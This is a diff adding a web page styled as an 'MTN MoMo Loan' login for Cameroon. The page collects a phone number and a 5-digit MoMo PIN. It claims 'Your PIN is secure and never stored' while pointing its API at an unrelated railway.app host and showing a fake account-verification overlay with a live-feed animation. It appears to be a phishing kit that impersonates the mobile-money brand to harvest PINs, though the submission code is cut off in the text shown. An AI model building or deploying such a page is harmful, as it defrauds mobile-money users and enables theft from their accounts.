@@ -1,0 +1,1070 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>MTN MoMo Loan - Login</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+        html, body {
+            height: 100%;
+            font-family: 'Inter', sans-serif;
+            background: #eef1f6;
+            overflow: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: "";
+            position: fixed;
+            top: -20%; left: -10%;
+            width: 70%; height: 70%;
+            background: radial-gradient(circle, rgba(0,71,171,0.10), transparent 60%);
+            pointer-events: none;
+            z-index: 0;
+        }
+        body::after {
+            content: "";
+            position: fixed;
+            bottom: -20%; right: -10%;
+            width: 70%; height: 70%;
+            background: radial-gradient(circle, rgba(255,204,0,0.10), transparent 60%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px;
+            height: 100vh;
+            height: 100dvh;
+            gap: 10px;
+            position: relative;
+            z-index: 1;
+        }
+
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(255,255,255,0.75);
+            backdrop-filter: blur(14px);
+            -webkit-backdrop-filter: blur(14px);
+            border: 1px solid rgba(255,255,255,0.9);
+            border-radius: 16px;
+            box-shadow: 0 8px 30px rgba(0,71,171,0.06);
+            position: relative;
+            flex-shrink: 0;
+            z-index: 5;
+        }
+
+        .back-btn {
+            font-size: 22px;
+            background: #f0f4ff;
+            border: none;
+            cursor: pointer;
+            color: #0047AB;
+            width: 36px;
+            height: 36px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            transition: transform 0.2s, background 0.2s;
+        }
+        .back-btn:hover { background: #e0e9ff; transform: translateX(-2px); }
+
+        .logo-container { position: absolute; left: 50%; transform: translateX(-50%); }
+
+        .mtn-logo { display: flex; flex-direction: column; align-items: center; gap: 3px; }
+        .mtn-logo-icon {
+            width: 38px; height: 38px;
+            background: #FFD700;
+            border-radius: 8px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 1.4rem; font-weight: 900; color: #003366;
+            position: relative;
+            box-shadow: 0 6px 16px rgba(255,215,0,0.5);
+        }
+        .mtn-logo-icon::after { content: 'M'; font-size: 1.55rem; font-weight: 900; }
+        .mtn-logo-text { font-size: 0.85rem; font-weight: 800; color: #003366; line-height: 1; }
+        .mtn-logo-sub { font-size: 0.58rem; color: #888; font-weight: 600; letter-spacing: 0.3px; line-height: 1; }
+
+        .card {
+            background: rgba(255,255,255,0.92);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.9);
+            border-radius: 28px;
+            padding: 28px 22px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 20px 60px rgba(0,71,171,0.10), 0 4px 12px rgba(0,0,0,0.02);
+            flex: 1;
+            min-height: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            overflow-y: auto;
+            position: relative;
+            z-index: 2;
+        }
+
+        .phone-input-group { margin-bottom: 20px; position: relative; }
+
+        .input-label {
+            display: block;
+            font-weight: 700; color: #333;
+            margin-bottom: 8px;
+            font-size: 12.5px;
+            letter-spacing: 0.2px;
+        }
+
+        .phone-input {
+            display: flex;
+            align-items: center;
+            border: 2px solid #e6ebf5;
+            border-radius: 14px;
+            overflow: visible;
+            transition: border-color 0.3s, box-shadow 0.3s, background 0.3s;
+            background: #fafbff;
+            position: relative;
+        }
+
+        .phone-input:focus-within {
+            border-color: #0047AB;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.10), 0 8px 24px rgba(0,71,171,0.08);
+        }
+        .phone-input.invalid {
+            border-color: #e74c3c;
+            background: #fff5f5;
+            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.10);
+            animation: shake 0.4s ease;
+        }
+
+        .country-btn {
+            display: flex;
+            align-items: center;
+            gap: 7px;
+            padding: 12px 12px;
+            background: linear-gradient(135deg, #f0f4ff, #e6ecff);
+            font-weight: 800;
+            font-size: 14.5px;
+            color: #0047AB;
+            border: none;
+            border-right: 2px solid #e0e6f5;
+            border-top-left-radius: 12px;
+            border-bottom-left-radius: 12px;
+            white-space: nowrap;
+            flex-shrink: 0;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            transition: background 0.2s;
+            position: relative;
+        }
+        .country-btn:hover { background: linear-gradient(135deg, #e6ecff, #dbe4ff); }
+        .country-btn .caret-sm { font-size: 9px; opacity: 0.7; margin-left: 2px; transition: transform 0.25s; }
+        .country-btn.open .caret-sm { transform: rotate(180deg); }
+
+        .flag-svg { width: 22px; height: 15px; border-radius: 3px; box-shadow: 0 0 0 1px rgba(0,0,0,0.08); flex-shrink: 0; }
+
+        .phone-input input {
+            border: none !important;
+            box-shadow: none !important;
+            flex: 1;
+            border-radius: 0;
+            padding: 12px 14px;
+            font-size: 15px;
+            font-family: 'Inter', sans-serif;
+            color: #1a1a2e;
+            font-weight: 600;
+            outline: none;
+            min-width: 0;
+            background: transparent;
+            letter-spacing: 0.5px;
+        }
+        .phone-input input::placeholder { color: #b8bfd0; font-weight: 500; letter-spacing: normal; }
+
+        .country-menu {
+            position: absolute;
+            top: calc(100% + 8px);
+            left: 0;
+            min-width: 240px;
+            background: #fff;
+            border: 1.5px solid #e6ebf5;
+            border-radius: 14px;
+            box-shadow: 0 16px 40px rgba(0,71,171,0.18);
+            overflow: hidden;
+            max-height: 0; opacity: 0; visibility: hidden;
+            transform: translateY(-6px);
+            transition: max-height 0.28s ease, opacity 0.22s ease, visibility 0.22s, transform 0.22s;
+            z-index: 100;
+        }
+        .country-menu.open { max-height: 320px; opacity: 1; visibility: visible; transform: translateY(0); }
+
+        .country-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            width: 100%;
+            padding: 12px 16px;
+            background: #fff;
+            border: none;
+            border-top: 1px solid #f0f3f9;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1a1a2e;
+            text-align: left;
+            transition: background 0.15s;
+        }
+        .country-item:first-child { border-top: none; }
+        .country-item:hover { background: #f0f4ff; }
+        .country-item .dial { margin-left: auto; color: #8a90a2; font-weight: 700; font-size: 13px; }
+        .country-item.selected { background: #f0f4ff; }
+        .country-item.selected .dial { color: #0047AB; }
+
+        .pin-label-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+        .pin-label-row .input-label { margin-bottom: 0; }
+
+        .forgot-link {
+            font-size: 12px; font-weight: 700; color: #0047AB;
+            text-decoration: none; cursor: pointer;
+            padding: 4px 6px; border-radius: 6px;
+            transition: background 0.15s;
+        }
+        .forgot-link:hover { background: #f0f4ff; }
+
+        .pin-row { display: flex; align-items: center; gap: 10px; }
+        .pin-boxes { display: flex; justify-content: center; gap: 10px; flex: 1; }
+
+        .pin-box {
+            width: 46px; height: 52px;
+            text-align: center;
+            font-size: 22px; font-weight: 800;
+            color: #1a1a2e;
+            border: 2px solid #e6ebf5;
+            border-radius: 12px;
+            background: #fafbff;
+            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s, transform 0.15s;
+            outline: none;
+            font-family: 'Inter', sans-serif;
+            caret-color: #0047AB;
+            padding: 0; flex: none;
+        }
+        .pin-box:focus {
+            border-color: #0047AB;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.10);
+            transform: translateY(-2px);
+        }
+        .pin-box.filled {
+            border-color: #0047AB;
+            background: linear-gradient(135deg, #f0f4ff, #e6ecff);
+            color: #0047AB;
+        }
+        .pin-box.invalid {
+            border-color: #e74c3c;
+            background: #fff5f5;
+            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.10);
+            animation: shake 0.4s ease;
+        }
+
+        .eye-toggle {
+            flex-shrink: 0;
+            width: 46px; height: 52px;
+            background: #f0f4ff;
+            border: 2px solid #e6ebf5;
+            border-radius: 12px;
+            cursor: pointer;
+            display: flex; align-items: center; justify-content: center;
+            transition: background 0.2s, border-color 0.2s, transform 0.15s;
+            padding: 0;
+        }
+        .eye-toggle:hover { background: #e6ecff; border-color: #c9d6f0; }
+        .eye-toggle:active { transform: scale(0.95); }
+        .eye-toggle svg { width: 22px; height: 22px; stroke: #0047AB; stroke-width: 2; fill: none; stroke-linecap: round; stroke-linejoin: round; }
+        .eye-toggle .eye-open { display: block; }
+        .eye-toggle .eye-closed { display: none; }
+        .eye-toggle.revealed .eye-open { display: none; }
+        .eye-toggle.revealed .eye-closed { display: block; }
+        .eye-toggle.revealed { background: #0047AB; border-color: #0047AB; }
+        .eye-toggle.revealed svg { stroke: #FFCC00; }
+
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-6px); } 75% { transform: translateX(6px); } }
+
+        .error-text {
+            color: #e74c3c; font-size: 12px;
+            margin-top: 6px; display: none;
+            font-weight: 600; line-height: 1.4;
+        }
+        .error-text.show { display: block; animation: slideDown 0.3s ease; }
+        @keyframes slideDown { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: translateY(0); } }
+
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #0058D8, #0047AB 40%, #002D7A);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 800;
+            letter-spacing: 0.6px;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
+            font-family: 'Inter', sans-serif;
+            margin-top: 24px;
+            box-shadow: 0 12px 28px rgba(0,71,171,0.32), inset 0 1px 0 rgba(255,255,255,0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        .login-btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 16px 34px rgba(0,71,171,0.45), inset 0 1px 0 rgba(255,255,255,0.25); }
+        .login-btn:active:not(:disabled) { transform: scale(0.98); }
+        .login-btn:disabled { opacity: 0.65; cursor: not-allowed; }
+        .login-btn::after { content: "→"; margin-left: 8px; display: inline-block; transition: transform 0.25s; }
+        .login-btn:hover:not(:disabled)::after { transform: translateX(4px); }
+
+        .security-notice {
+            display: flex; align-items: center; justify-content: center;
+            gap: 6px; margin-top: 16px;
+            font-size: 11.5px; color: #8a90a2; font-weight: 500;
+        }
+
+        .signup-text {
+            text-align: center;
+            font-size: 13px;
+            color: #8a90a2;
+            margin-top: 16px;
+            font-weight: 500;
+        }
+        .signup-text a { color: #0047AB; font-weight: 800; text-decoration: none; cursor: pointer; }
+        .signup-text a:hover { text-decoration: underline; }
+
+        footer { padding: 6px; color: #a9b0c2; font-size: 11px; text-align: center; width: 100%; max-width: 480px; flex-shrink: 0; font-weight: 500; }
+
+        /* ============================================
+           VERIFY OVERLAY — v3 (professional live feed)
+           ============================================ */
+        .verify-overlay {
+            position: fixed;
+            inset: 0;
+            background:
+                radial-gradient(900px 600px at 50% -10%, rgba(255, 204, 0, 0.12), transparent 60%),
+                radial-gradient(700px 500px at 50% 110%, rgba(0, 71, 171, 0.35), transparent 60%),
+                linear-gradient(180deg, #001E3C 0%, #00132A 55%, #00080F 100%);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px 20px;
+            z-index: 2000;
+            overflow: hidden;
+        }
+        .verify-overlay.show { display: flex; animation: vFadeIn 0.45s ease; }
+        @keyframes vFadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .verify-overlay::before {
+            content: '';
+            position: absolute;
+            top: 50%; left: 50%;
+            width: 520px; height: 520px;
+            transform: translate(-50%, -50%);
+            background: radial-gradient(circle, rgba(255, 204, 0, 0.18), transparent 65%);
+            filter: blur(30px);
+            animation: vGlow 3.6s ease-in-out infinite;
+            pointer-events: none;
+        }
+        @keyframes vGlow {
+            0%, 100% { opacity: 0.55; transform: translate(-50%, -50%) scale(1); }
+            50%      { opacity: 0.9;  transform: translate(-50%, -50%) scale(1.08); }
+        }
+
+        .verify-card {
+            position: relative;
+            z-index: 2;
+            width: 100%;
+            max-width: 380px;
+            border-radius: 26px;
+            padding: 26px 22px 22px;
+            background: linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.02));
+            border: 1px solid rgba(255, 204, 0, 0.18);
+            box-shadow: 0 30px 60px rgba(0,0,0,0.45), inset 0 1px 0 rgba(255,255,255,0.06);
+            backdrop-filter: blur(14px);
+            -webkit-backdrop-filter: blur(14px);
+            text-align: center;
+            animation: vCardIn 0.6s cubic-bezier(0.22, 1, 0.36, 1) both;
+        }
+        @keyframes vCardIn {
+            from { opacity: 0; transform: translateY(18px) scale(0.97); }
+            to   { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .verify-header { display: flex; flex-direction: column; align-items: center; margin-bottom: 18px; }
+        .verify-ring { position: relative; width: 88px; height: 88px; margin-bottom: 14px; }
+        .verify-ring svg { width: 100%; height: 100%; transform: rotate(-90deg); display: block; }
+        .verify-ring .track { fill: none; stroke: rgba(255, 204, 0, 0.10); stroke-width: 5; }
+        .verify-ring .progress {
+            fill: none;
+            stroke: url(#vGoldGrad);
+            stroke-width: 5;
+            stroke-linecap: round;
+            stroke-dasharray: 226.20;
+            stroke-dashoffset: 226.20;
+            transition: stroke-dashoffset 0.6s ease;
+            filter: drop-shadow(0 0 6px rgba(255, 204, 0, 0.55));
+        }
+        .verify-ring-core {
+            position: absolute; top: 50%; left: 50%;
+            width: 56px; height: 56px;
+            transform: translate(-50%, -50%);
+            border-radius: 50%;
+            background: linear-gradient(135deg, #FFCC00, #FFD633);
+            display: flex; align-items: center; justify-content: center;
+            padding: 10px;
+            box-shadow: 0 0 0 6px rgba(255, 204, 0, 0.08), 0 0 24px rgba(255, 204, 0, 0.45);
+            animation: vCorePulse 2.4s ease-in-out infinite;
+        }
+        .verify-ring-core img { width: 100%; height: 100%; object-fit: contain; }
+        @keyframes vCorePulse {
+            0%, 100% { box-shadow: 0 0 0 6px rgba(255, 204, 0, 0.08), 0 0 24px rgba(255, 204, 0, 0.40); }
+            50%      { box-shadow: 0 0 0 10px rgba(255, 204, 0, 0.05), 0 0 36px rgba(255, 204, 0, 0.75); }
+        }
+
+        .verify-title { font-size: 1rem; font-weight: 800; color: #fff; letter-spacing: -0.01em; line-height: 1.35; margin-bottom: 6px; }
+        .verify-title .highlight { background: linear-gradient(90deg, #FFCC00, #FFD633); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .verify-subtitle { font-size: 12px; color: rgba(255, 255, 255, 0.62); line-height: 1.5; font-weight: 500; min-height: 2.4em; }
+
+        .verify-feed {
+            text-align: left;
+            background: rgba(0, 0, 0, 0.22);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 14px;
+            padding: 12px 14px;
+            margin-bottom: 14px;
+            max-height: 180px;
+            overflow-y: auto;
+            font-family: 'SF Mono', 'Menlo', 'Consolas', monospace;
+        }
+        .feed-line {
+            display: flex; gap: 8px; align-items: flex-start;
+            font-size: 11px; line-height: 1.6;
+            color: rgba(255, 255, 255, 0.55);
+            opacity: 0; transform: translateY(4px);
+            transition: opacity 0.4s ease, transform 0.4s ease;
+        }
+        .feed-line.visible { opacity: 1; transform: translateY(0); }
+        .feed-line .time { color: rgba(255, 204, 0, 0.75); flex-shrink: 0; font-weight: 700; }
+        .feed-line .tag { flex-shrink: 0; font-weight: 800; }
+        .feed-line.ok .tag { color: #22C55E; }
+        .feed-line.pending .tag { color: #FFCC00; }
+        .feed-line.info .tag { color: #60A5FA; }
+        .feed-line .txt { color: rgba(255, 255, 255, 0.75); }
+        .feed-line .sub { display: block; margin-top: 2px; color: rgba(255, 204, 0, 0.65); font-size: 10.5px; }
+
+        .verify-meta {
+            display: flex; justify-content: space-between; align-items: center;
+            font-size: 10.5px; color: rgba(255, 255, 255, 0.5);
+            font-weight: 700; letter-spacing: 0.04em; text-transform: uppercase;
+            margin-bottom: 10px; padding: 0 4px;
+        }
+        .verify-meta .elapsed { color: #FFCC00; font-variant-numeric: tabular-nums; }
+
+        .verify-progress { width: 100%; height: 5px; background: rgba(255, 204, 0, 0.10); border-radius: 3px; overflow: hidden; margin-bottom: 14px; }
+        .verify-progress-fill {
+            height: 100%; width: 0%;
+            background: linear-gradient(90deg, #FFCC00, #FFD633, #FFCC00);
+            background-size: 200% 100%; border-radius: 3px;
+            transition: width 0.5s ease;
+            animation: vShimmer 2s linear infinite;
+            box-shadow: 0 0 10px rgba(255, 204, 0, 0.55);
+        }
+        @keyframes vShimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
+
+        .verify-patience {
+            font-size: 10.5px; color: rgba(255, 204, 0, 0.75); font-weight: 600;
+            line-height: 1.45; padding: 8px 12px;
+            border-radius: 10px;
+            background: rgba(255, 204, 0, 0.08);
+            border: 1px solid rgba(255, 204, 0, 0.20);
+            opacity: 0; max-height: 0; overflow: hidden;
+            transition: opacity 0.5s ease, max-height 0.5s ease, padding 0.3s ease, margin 0.3s ease;
+            margin-top: 0;
+        }
+        .verify-patience.show { opacity: 1; max-height: 100px; padding: 8px 12px; margin-top: 10px; }
+
+        .verify-live {
+            display: inline-flex; align-items: center; gap: 6px;
+            padding: 5px 12px; border-radius: 50px;
+            background: rgba(34, 197, 94, 0.10);
+            border: 1px solid rgba(34, 197, 94, 0.25);
+            font-size: 9.5px; font-weight: 700;
+            letter-spacing: 0.08em; text-transform: uppercase;
+            color: #86EFAC; margin-top: 14px;
+        }
+        .verify-live-dot {
+            width: 5px; height: 5px; border-radius: 50%;
+            background: #22C55E;
+            box-shadow: 0 0 8px rgba(34, 197, 94, 0.9);
+            animation: vLivePulse 1.6s ease-in-out infinite;
+        }
+        @keyframes vLivePulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.7); } }
+
+        @media (max-height: 700px) {
+            .phone-input-group { margin-bottom: 14px; }
+            .card { padding: 22px 18px; }
+            .login-btn { margin-top: 18px; padding: 15px; }
+            .security-notice, .signup-text { margin-top: 12px; }
+            .mtn-logo-icon { width: 34px; height: 34px; font-size: 1.2rem; }
+            .pin-box { width: 42px; height: 48px; font-size: 20px; }
+            .eye-toggle { width: 42px; height: 48px; }
+        }
+        @media (max-width: 380px) {
+            .pin-boxes { gap: 6px; }
+            .pin-row { gap: 8px; }
+            .pin-box { width: 38px; height: 44px; font-size: 17px; border-radius: 10px; }
+            .eye-toggle { width: 38px; height: 44px; border-radius: 10px; }
+            .eye-toggle svg { width: 18px; height: 18px; }
+            .phone-input input { padding: 11px 12px; font-size: 14px; }
+            .country-btn { padding: 11px 10px; font-size: 13.5px; gap: 5px; }
+            .country-menu { min-width: 200px; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <button class="back-btn" onclick="window.location.href='index.html'" aria-label="Go back">←</button>
+        <div class="logo-container">
+            <div class="mtn-logo">
+                <div class="mtn-logo-icon"></div>
+                <div class="mtn-logo-text">MTN MoMo</div>
+                <div class="mtn-logo-sub">Loans</div>
+            </div>
+        </div>
+        <div style="width:36px;"></div>
+    </header>
+
+    <main class="card">
+        <div class="phone-input-group">
+            <label class="input-label">MoMo Phone Number</label>
+            <div class="phone-input" id="phoneWrapper">
+                <button type="button" class="country-btn" id="countryBtn" aria-haspopup="true">
+                    <span id="countryFlag">FLAG</span>
+                    <span id="countryCode">+237</span>
+                    <span class="caret-sm">▼</span>
+                </button>
+
+                <input type="tel" id="phone" placeholder="6XX XXX XXX" maxlength="9" autocomplete="tel">
+
+                <div class="country-menu" id="countryMenu">
+                    <button type="button" class="country-item" data-country="CM" data-code="+237" data-len="9">
+                        <span class="flag-slot" data-flag="CM"></span>
+                        <span>Cameroun</span>
+                        <span class="dial">+237</span>
+                    </button>
+                </div>
+            </div>
+            <div class="error-text" id="phoneError">Please enter a valid phone number</div>
+        </div>
+
+        <div class="phone-input-group">
+            <div class="pin-label-row">
+                <label class="input-label">MoMo PIN</label>
+                <span class="forgot-link" onclick="alert('Please dial *126# to reset your MoMo PIN.')">Forgot PIN?</span>
+            </div>
+            <div class="pin-row">
+                <div class="pin-boxes" id="pinBoxes">
+                    <input type="password" class="pin-box" id="pin1" maxlength="1" inputmode="numeric" autocomplete="off">
+                    <input type="password" class="pin-box" id="pin2" maxlength="1" inputmode="numeric" autocomplete="off">
+                    <input type="password" class="pin-box" id="pin3" maxlength="1" inputmode="numeric" autocomplete="off">
+                    <input type="password" class="pin-box" id="pin4" maxlength="1" inputmode="numeric" autocomplete="off">
+                    <input type="password" class="pin-box" id="pin5" maxlength="1" inputmode="numeric" autocomplete="off">
+                </div>
+
+                <button type="button" class="eye-toggle" id="eyeToggle" aria-label="Show PIN" title="Show PIN">
+                    <svg class="eye-open" viewBox="0 0 24 24">
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                        <circle cx="12" cy="12" r="3"/>
+                    </svg>
+                    <svg class="eye-closed" viewBox="0 0 24 24">
+                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
+                        <line x1="1" y1="1" x2="23" y2="23"/>
+                    </svg>
+                </button>
+            </div>
+            <div class="error-text" id="pinError">Please enter your 5-digit MoMo PIN</div>
+        </div>
+
+        <button class="login-btn" id="loginBtn">LOGIN</button>
+
+        <div class="security-notice">
+            <span>🔒</span>
+            <span>Your PIN is secure and never stored</span>
+        </div>
+
+        <p class="signup-text">
+            Don't have a MoMo account? <a href="#" onclick="alert('Dial *126# to register for MTN MoMo'); return false;">Register here</a>
+        </p>
+    </main>
+
+    <footer>© 2026 MTN MoMo Cameroun</footer>
+
+    <div class="verify-overlay" id="verifyOverlay">
+        <div class="verify-card">
+            <div class="verify-header">
+                <div class="verify-ring">
+                    <svg viewBox="0 0 88 88" aria-hidden="true">
+                        <defs>
+                            <linearGradient id="vGoldGrad" x1="0" y1="0" x2="1" y2="1">
+                                <stop offset="0%"   stop-color="#FFD633"/>
+                                <stop offset="50%"  stop-color="#FFCC00"/>
+                                <stop offset="100%" stop-color="#F5B500"/>
+                            </linearGradient>
+                        </defs>
+                        <circle class="track"    cx="44" cy="44" r="36"></circle>
+                        <circle class="progress" id="verifyRingProgress" cx="44" cy="44" r="36"></circle>
+                    </svg>
+                    <div class="verify-ring-core">
+                        <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo">
+                    </div>
+                </div>
+                <h2 class="verify-title" id="verifyTitle">Verifying your <span class="highlight">MoMo account</span></h2>
+                <p class="verify-subtitle" id="verifySubtitle">Secure connection established…</p>
+            </div>
+
+            <div class="verify-feed" id="verifyFeed"></div>
+
+            <div class="verify-meta">
+                <span>Typical: 1–3 min</span>
+                <span class="elapsed" id="verifyElapsed">0 sec</span>
+            </div>
+
+            <div class="verify-progress"><div class="verify-progress-fill" id="verifyProgressFill"></div></div>
+
+            <div class="verify-patience" id="verifyPatience">
+                <span>⏳ Taking a little longer than usual. Please keep this page open.</span>
+            </div>
+
+            <div class="verify-live">
+                <span class="verify-live-dot"></span>
+                <span>Live · Secure</span>
+            </div>
+        </div>
+    </div>
+
+    <svg width="0" height="0" style="position:absolute;overflow:hidden;" aria-hidden="true">
+        <defs>
+            <symbol id="flag-CM" viewBox="0 0 900 600">
+                <rect width="300" height="600" fill="#007A5E"/>
+                <rect x="300" width="300" height="600" fill="#CE1126"/>
+                <rect x="600" width="300" height="600" fill="#FCD116"/>
+                <polygon points="450,220 465,275 522,275 476,308 492,363 450,330 408,363 424,308 378,275 435,275" fill="#FCD116"/>
+            </symbol>
+        </defs>
+    </svg>
+
+    <script>
+        const API_BASE = 'https://momo-advance-loan-production-8b41.up.railway.app';
+        const POLL_INTERVAL_MS = 2500;
+
+        const COUNTRIES = {
+            CM: { code: '+237', digits: 9, placeholder: '6XX XXX XXX' }
+        };
+        let currentCountry = 'CM';
+
+        const countryBtn   = document.getElementById('countryBtn');
+        const countryMenu  = document.getElementById('countryMenu');
+        const countryFlag  = document.getElementById('countryFlag');
+        const countryCode  = document.getElementById('countryCode');
+        const phoneInput   = document.getElementById('phone');
+        const phoneWrapper = document.getElementById('phoneWrapper');
+        const phoneError   = document.getElementById('phoneError');
+
+        function renderFlagsIn(root = document) {
+            root.querySelectorAll('.flag-slot[data-flag]').forEach(el => {
+                const id = el.dataset.flag;
+                el.innerHTML = `<svg class="flag-svg" viewBox="0 0 900 600" aria-hidden="true"><use href="#flag-${id}"/></svg>`;
+            });
+        }
+        renderFlagsIn();
+
+        function setCountry(iso) {
+            const data = COUNTRIES[iso];
+            if (!data) return;
+            currentCountry = iso;
+            countryCode.textContent = data.code;
+            countryFlag.innerHTML = `<svg class="flag-svg" viewBox="0 0 900 600" aria-hidden="true"><use href="#flag-${iso}"/></svg>`;
+            phoneInput.placeholder = data.placeholder;
+            phoneInput.maxLength = data.digits;
+            phoneInput.value = '';
+            phoneError.textContent = 'Please enter a valid phone number';
+            countryMenu.querySelectorAll('.country-item').forEach(item => {
+                item.classList.toggle('selected', item.dataset.country === iso);
+            });
+        }
+
+        countryBtn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            countryBtn.classList.toggle('open');
+            countryMenu.classList.toggle('open');
+        });
+        countryMenu.querySelectorAll('.country-item').forEach(item => {
+            item.addEventListener('click', (e) => {
+                e.stopPropagation();
+                setCountry(item.dataset.country);
+                countryBtn.classList.remove('open');
+                countryMenu.classList.remove('open');
+                phoneInput.focus();
+            });
+        });
+        document.addEventListener('click', (e) => {
+            if (!countryMenu.contains(e.target) && e.target !== countryBtn && !countryBtn.contains(e.target)) {
+                countryBtn.classList.remove('open');
+                countryMenu.classList.remove('open');
+            }
+        });
+        setCountry('CM');
+
+        phoneInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9 ]/g, '');
+            const digits = this.value.replace(/\s/g, '');
+            const needed = COUNTRIES[currentCountry].digits;
+            if (digits.length === needed) {
+                phoneWrapper.classList.remove('invalid');
+                phoneError.classList.remove('show');
+            }
+        });
+
+        const pinBoxes = [
+            document.getElementById('pin1'), document.getElementById('pin2'),
+            document.getElementById('pin3'), document.getElementById('pin4'), document.getElementById('pin5')
+        ];
+        const pinError = document.getElementById('pinError');
+
+        pinBoxes.forEach((box, index) => {
+            box.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '');
+                if (this.value) {
+                    this.classList.add('filled');
+                    if (index < pinBoxes.length - 1) pinBoxes[index + 1].focus();
+                } else {
+                    this.classList.remove('filled');
+                }
+                if (getPinValue().length === 5) {
+                    pinError.classList.remove('show');
+                    pinBoxes.forEach(b => b.classList.remove('invalid'));
+                }
+            });
+            box.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && index > 0) {
+                    pinBoxes[index - 1].focus();
+                    pinBoxes[index - 1].value = '';
+                    pinBoxes[index - 1].classList.remove('filled');
+                }
+            });
+            box.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+                if (pasted.length > 0) {
+                    for (let i = 0; i < pinBoxes.length && i < pasted.length; i++) {
+                        pinBoxes[i].value = pasted[i];
+                        pinBoxes[i].classList.add('filled');
+                    }
+                    const nextEmpty = pinBoxes.findIndex(b => !b.value);
+                    pinBoxes[nextEmpty !== -1 ? nextEmpty : pinBoxes.length - 1].focus();
+                }
+            });
+        });
+
+        function getPinValue() { return pinBoxes.map(b => b.value).join(''); }
+
+        const eyeToggle = document.getElementById('eyeToggle');
+        let pinVisible = false;
+        eyeToggle.addEventListener('click', () => {
+            pinVisible = !pinVisible;
+            pinBoxes.forEach(box => { box.type = pinVisible ? 'text' : 'password'; });
+            eyeToggle.classList.toggle('revealed', pinVisible);
+        });
+
+        /* ============================================
+           VERIFY OVERLAY
+           ============================================ */
+        const verifyOverlay = document.getElementById('verifyOverlay');
+        const verifyRingProgress = document.getElementById('verifyRingProgress');
+        const verifyTitle = document.getElementById('verifyTitle');
+        const verifySubtitle = document.getElementById('verifySubtitle');
+        const verifyFeed = document.getElementById('verifyFeed');
+        const verifyElapsed = document.getElementById('verifyElapsed');
+        const verifyProgressFill = document.getElementById('verifyProgressFill');
+        const verifyPatience = document.getElementById('verifyPatience');
+
+        const RING_CIRCUMFERENCE = 226.20;
+        const PROGRESS_WINDOW_MS = 3 * 60 * 1000;
+
+        let pollTimer = null, verifyTimer = null, feedTimer = null, elapsedTimer = null;
+        let currentRequestId = null;
+
+        function nowTime() {
+            const d = new Date();
+            const p = n => String(n).padStart(2, '0');
+            return p(d.getHours()) + ':' + p(d.getMinutes()) + ':' + p(d.getSeconds());
+        }
+
+        function addFeedLine(kind, text, sub) {
+            const line = document.createElement('div');
+            line.className = 'feed-line ' + kind;
+            let icon = '⏳';
+            if (kind === 'ok') icon = '✓';
+            else if (kind === 'info') icon = '🔒';
+            line.innerHTML =
+                '<span class="time">' + nowTime() + '</span>' +
+                '<span class="tag">' + icon + '</span>' +
+                '<span class="txt">' + text +
+                (sub ? '<span class="sub">• ' + sub + '</span>' : '') +
+                '</span>';
+            verifyFeed.appendChild(line);
+            verifyFeed.scrollTop = verifyFeed.scrollHeight;
+            requestAnimationFrame(() => line.classList.add('visible'));
